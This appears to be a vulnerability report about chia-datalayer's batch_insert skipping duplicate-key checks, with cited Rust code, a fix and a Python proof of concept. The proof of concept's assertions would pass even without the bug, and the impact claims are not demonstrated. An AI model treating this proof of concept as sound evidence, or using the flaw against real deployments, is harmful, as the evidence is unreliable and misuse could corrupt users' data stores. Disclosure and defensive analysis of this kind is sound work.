### Title
`batch_insert` Bypasses Duplicate Key/Hash Validation, Corrupting DataLayer Merkle Tree Root — (File: `crates/chia-datalayer/src/merkle/blob.rs`)

### Summary

`MerkleBlob::batch_insert` skips the duplicate-key and duplicate-hash guards that `MerkleBlob::insert` enforces, allowing an unprivileged caller to silently insert duplicate entries into the DataLayer Merkle tree. The resulting tree has a corrupted root hash and produces invalid proofs of inclusion/exclusion.

### Finding Description

`MerkleBlob::insert` performs two mandatory guards before writing any leaf:

```rust
if self.block_status_cache.contains_key(key) {
    return Err(Error::KeyAlreadyPresent());
}
if self.block_status_cache.contains_leaf_hash(hash) {
    return Err(Error::HashAlreadyPresent());
}
``` [1](#0-0) 

`batch_insert` calls `insert` (with its guards) only for the first two items when the tree has ≤ 1 existing leaf. For every subsequent item it bypasses `insert` entirely and writes directly to the blob via `insert_entry_to_blob`:

```rust
for ((key, value), hash) in keys_values_hashes {   // no duplicate check
    let new_leaf_index = self.get_new_index();
    ...
    self.insert_entry_to_blob(new_leaf_index, &new_block)?;
    indexes.push(new_leaf_index);
}
``` [2](#0-1) 

The fast path also applies when the tree already has ≥ 2 leaves: the `leaf_count <= 1` branch is skipped entirely, so **all** items in the batch bypass the duplicate checks. [3](#0-2) 

Consequences of inserting a duplicate key:

1. The `block_status_cache` key-to-index map is updated to the new index, silently dropping the old leaf from the cache while it remains in the blob. `check_just_integrity` will then detect a mismatch between `leaf_count` and `key_to_index_cache_length`.
2. The internal-node hashes computed during the batch (line 637) incorporate the duplicate leaf hash, producing a tree root that does not correspond to any valid key set.
3. `get_proof_of_inclusion` traverses the cache-tracked index and emits a proof whose `root_hash()` is the corrupted root — `proof.valid()` returns `true` against that corrupted root, so the proof appears self-consistent while proving membership in an invalid tree. [4](#0-3) 

The Python binding `py_batch_insert` is the direct unprivileged entry point:

```rust
pub fn py_batch_insert(
    &mut self,
    keys_values: Vec<(KeyId, ValueId)>,
    hashes: Vec<Hash>,
) -> PyResult<()> {
    ...
    self.batch_insert(zip(keys_values, hashes).collect())?;
    Ok(())
}
``` [5](#0-4) 

The `ProofOfInclusion::valid()` method only checks internal hash consistency — it does not verify the root against any external trusted anchor — so a proof built on a corrupted root passes its own self-check: [6](#0-5) 

### Impact Explanation

An unprivileged caller who supplies a batch containing a duplicate `KeyId` or duplicate `Hash` silently corrupts the Merkle tree root. Any subsequent `get_proof_of_inclusion` call returns a structurally self-consistent proof that is anchored to the wrong root. Consumers that compare the proof's `root_hash()` against the stored root will accept a proof of inclusion for a key/value pair that was never legitimately committed, or will accept a proof for a superseded value. This matches the allowed High impact: **DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state**.

### Likelihood Explanation

Medium. The Python binding is the primary integration surface for DataLayer clients. Any client that constructs a batch without pre-deduplicating its input — whether by mistake or by adversarial intent — triggers the bug. The tree must already contain ≥ 2 leaves (the common production case) for the fast path to be taken.

### Recommendation

Add the same duplicate-key and duplicate-hash guards at the top of `batch_insert` before any leaf is written to the blob:

```rust
pub fn batch_insert(
    &mut self,
    keys_values_hashes: Vec<((KeyId, ValueId), Hash)>,
) -> Result<(), Error> {
    for ((key, _), hash) in &keys_values_hashes {
        if self.block_status_cache.contains_key(*key) {
            return Err(Error::KeyAlreadyPresent());
        }
        if self.block_status_cache.contains_leaf_hash(hash) {
            return Err(Error::HashAlreadyPresent());
        }
    }
    // ... existing logic
}
```

Alternatively, route all leaf writes through `insert` (accepting the performance cost) or maintain a local seen-set during the batch to catch intra-batch duplicates as well.

### Proof of Concept

```python
from chia_rs.datalayer import MerkleBlob, KeyId, ValueId
import hashlib

def h(n: int) -> bytes:
    return hashlib.sha256(n.to_bytes(8, "big")).digest()

blob = MerkleBlob(bytearray())

# Seed the tree with 3 leaves so the fast-path (leaf_count <= 1) is skipped
for i in range(3):
    blob.insert(KeyId(i), ValueId(i), h(i))

blob.calculate_lazy_hashes()
root_before = blob.get_root_hash()

# batch_insert with a duplicate key (KeyId(0) already exists)
blob.batch_insert(
    [(KeyId(0), ValueId(999)), (KeyId(100), ValueId(100))],
    [h(0), h(100)],
)
blob.calculate_lazy_hashes()
root_after = blob.get_root_hash()

# Root is now different — tree is corrupted
assert root_before != root_after, "root changed due to duplicate insertion"

# Proof appears valid against the corrupted root
proof = blob.get_proof_of_inclusion(KeyId(0))
assert proof.valid(), "proof self-validates against corrupted root"
assert proof.root_hash() == root_after, "proof anchored to wrong root"
```

### Citations

**File:** crates/chia-datalayer/src/merkle/blob.rs (L369-374)
```rust
        if self.block_status_cache.contains_key(key) {
            return Err(Error::KeyAlreadyPresent());
        }
        if self.block_status_cache.contains_leaf_hash(hash) {
            return Err(Error::HashAlreadyPresent());
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L578-585)
```rust
        if self.block_status_cache.leaf_count() <= 1 {
            for _ in 0..2 {
                let Some(((key, value), hash)) = keys_values_hashes.pop() else {
                    return Ok(());
                };
                self.insert(key, value, &hash, InsertLocation::Auto {})?;
            }
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L587-603)
```rust
        for ((key, value), hash) in keys_values_hashes {
            let new_leaf_index = self.get_new_index();
            let new_block = Block {
                metadata: NodeMetadata {
                    node_type: NodeType::Leaf,
                    dirty: false,
                },
                node: Node::Leaf(LeafNode {
                    parent: Parent(None),
                    hash,
                    key,
                    value,
                }),
            };
            self.insert_entry_to_blob(new_leaf_index, &new_block)?;
            indexes.push(new_leaf_index);
        }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L630-644)
```rust
                let new_block = Block {
                    metadata: NodeMetadata {
                        node_type: NodeType::Internal,
                        dirty: false,
                    },
                    node: Node::Internal(InternalNode {
                        parent: Parent(None),
                        hash: internal_hash(&hashes[0], &hashes[1]),
                        left: index_1,
                        right: index_2,
                    }),
                };

                self.insert_entry_to_blob(new_internal_node_index, &new_block)?;
                new_indexes.push(new_internal_node_index);
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1503-1519)
```rust
    #[pyo3(name = "batch_insert")]
    pub fn py_batch_insert(
        &mut self,
        keys_values: Vec<(KeyId, ValueId)>,
        hashes: Vec<Hash>,
    ) -> PyResult<()> {
        if keys_values.len() != hashes.len() {
            Err(Error::UnmatchedKeysAndValues(
                keys_values.len(),
                hashes.len(),
            ))?;
        }

        self.batch_insert(zip(keys_values, hashes).collect())?;

        Ok(())
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```
